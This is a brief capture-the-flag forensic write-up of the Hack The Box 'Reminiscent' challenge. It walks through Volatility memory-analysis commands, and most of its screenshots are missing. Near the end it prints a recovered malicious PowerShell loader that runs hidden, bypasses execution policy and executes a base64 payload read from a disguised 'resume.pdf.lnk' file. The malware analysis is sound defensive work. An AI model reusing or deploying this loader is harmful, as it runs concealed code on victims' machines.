# Reminiscent (Forensic Challenge)

Source: <https://enterprise.hackthebox.com/dedicated-lab-profile/challenge/1117/39>

volatility
[https://github.com/volatilityfoundation/volatility/wiki/Installation](https://github.com/volatilityfoundation/volatility/wiki/Installation)

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

```bash
imageinfo -f
```

```bash
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
```

```bash
specify profile
```

*[image unavailable]*

```bash
pslist
```

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

```bash
psscan
```

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

```bash
consoles
```

*[image unavailable]*
*[image unavailable]*

```bash
filescan
```

*[image unavailable]*

```bash
physoffset
```

```bash
vol.py --profile=Win7SP1x64 dumpfiles --physoffset 0x000000001e8feb70 -f ../../../Downloads/reminiscent/flounder-pc-memdump.elf --dump-dir ../../htb/
```

*[image unavailable]*

*[image unavailable]*
*[image unavailable]*

```bash
powershell.exe -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7')); iex $r;C:\Windows\system32\SHELL32.dll
```

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
